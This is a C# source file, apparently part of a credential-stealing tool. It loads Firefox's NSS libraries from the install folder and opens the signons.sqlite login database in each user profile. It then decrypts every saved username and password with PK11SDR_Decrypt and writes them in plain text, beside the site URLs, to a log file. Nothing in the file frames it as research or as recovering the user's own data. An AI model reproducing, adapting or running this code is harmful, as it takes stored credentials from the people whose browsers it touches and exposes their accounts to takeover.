using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Data;
using System.Text;
using System.Threading;

namespace Hdds
{
    static class FfDecryptor
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct TsecItem
        {
            public int SecItemType;
            public int SecItemData;
            public int SecItemLen;
        }

        public static string Log;

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string dllFilePath);
        static IntPtr _nss3;
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DllFunctionDelegate(string configdir);
        public static long NSS_Init(string configdir)
        {
            string mozillaPath = Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Mozilla Firefox\";
            LoadLibrary(mozillaPath + "mozcrt19.dll");
            LoadLibrary(mozillaPath + "nspr4.dll");
            LoadLibrary(mozillaPath + "plc4.dll");
            LoadLibrary(mozillaPath + "plds4.dll");
            LoadLibrary(mozillaPath + "ssutil3.dll");
            LoadLibrary(mozillaPath + "sqlite3.dll");
            LoadLibrary(mozillaPath + "nssutil3.dll");
            LoadLibrary(mozillaPath + "softokn3.dll");
            _nss3 = LoadLibrary(mozillaPath + "nss3.dll");
            IntPtr pProc = GetProcAddress(_nss3, "NSS_Init");
            var dll = (DllFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DllFunctionDelegate));
            return dll(configdir);
        }
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DllFunctionDelegate2();
        public static long PK11_GetInternalKeySlot()
        {
            IntPtr pProc = GetProcAddress(_nss3, "PK11_GetInternalKeySlot");
            var dll = (DllFunctionDelegate2)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DllFunctionDelegate2));
            return dll();
        }
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DllFunctionDelegate3(long slot, bool loadCerts, long wincx);
        public static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            IntPtr pProc = GetProcAddress(_nss3, "PK11_Authenticate");
            var dll = (DllFunctionDelegate3)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DllFunctionDelegate3));
            return dll(slot, loadCerts, wincx);
        }
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DllFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
        public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            IntPtr pProc = GetProcAddress(_nss3, "NSSBase64_DecodeBuffer");
            var dll = (DllFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DllFunctionDelegate4));
            return dll(arenaOpt, outItemOpt, inStr, inLen);
        }
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DllFunctionDelegate5(ref TsecItem data, ref TsecItem result, int cx);
        public static int PK11SDR_Decrypt(ref TsecItem data, ref TsecItem result, int cx)
        {
            IntPtr pProc = GetProcAddress(_nss3, "PK11SDR_Decrypt");
            var dll = (DllFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DllFunctionDelegate5));
            return dll(ref data, ref result, cx);
        }
        //PK11_GetInternalKeySlot

        public static string Signon;

        public static void GetFf()
        {
            if (File.Exists(Config.Logname))
            {
                File.Delete(Config.Logname);
            }
            StreamWriter writer = File.CreateText(Config.Logname);
            long keySlot = 0;
            string defaultPath = Environment.GetEnvironmentVariable("APPDATA") + @"\Mozilla\Firefox\Profiles";
            string[] dirs = Directory.GetDirectories(defaultPath);
            foreach (string dir in dirs)
            {
                if (true)
                {
                    string[] files = Directory.GetFiles(dir);
                    foreach (string currFile in files)
                    {
                        if (true)
                        {
                            if (System.Text.RegularExpressions.Regex.IsMatch(currFile, "signons.sqlite"))
                            {
                                NSS_Init(dir);
                                Signon = currFile;
                            }
                        }
                    }
                }
            }

            string dataSource = Signon;
            new TsecItem();
            var tSecDec = new TsecItem();
            var tSecDec2 = new TsecItem();
            var db = new SQLiteBase(dataSource);

            DataTable table = db.ExecuteQuery("SELECT * FROM moz_logins;");
            DataTable table2 = db.ExecuteQuery("SELECT * FROM moz_disabledHosts;");
            foreach (DataRow row in table2.Rows)
            {
                Log = row["hostname"].ToString();
            }
            keySlot = PK11_GetInternalKeySlot();
            PK11_Authenticate(keySlot, true, 0);
            foreach (DataRow Zeile in table.Rows)
            {
                string formurl = Convert.ToString(Zeile["formSubmitURL"].ToString());
                Log = Log + " URL: " + formurl + " ";
                var se = new StringBuilder(Zeile["encryptedUsername"].ToString());
                int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length);
                var item = (TsecItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TsecItem));
                byte[] bvRet;
                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SecItemLen != 0)
                    {
                        bvRet = new byte[tSecDec.SecItemLen];
                        Marshal.Copy(new IntPtr(tSecDec.SecItemData), bvRet, 0, tSecDec.SecItemLen);
                        Log = Log + "USER: " + Encoding.ASCII.GetString(bvRet) + " ";
                    }
                }
                var se2 = new StringBuilder(Zeile["encryptedPassword"].ToString());
                int hi22 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se2, se2.Length);
                var item2 = (TsecItem)Marshal.PtrToStructure(new IntPtr(hi22), typeof(TsecItem));
                if (PK11SDR_Decrypt(ref item2, ref tSecDec2, 0) == 0)
                {
                    if (tSecDec2.SecItemLen != 0)
                    {
                        bvRet = new byte[tSecDec2.SecItemLen];
                        Marshal.Copy(new IntPtr(tSecDec2.SecItemData), bvRet, 0, tSecDec2.SecItemLen);
                        Log = Log + "PASSWORD: " + Encoding.ASCII.GetString(bvRet);
                    }
                }
                Thread.Sleep(500);
                writer.WriteLine(Log);
                writer.Flush();
                Log = "";
                
            }
            writer.Close();
        }

    }
}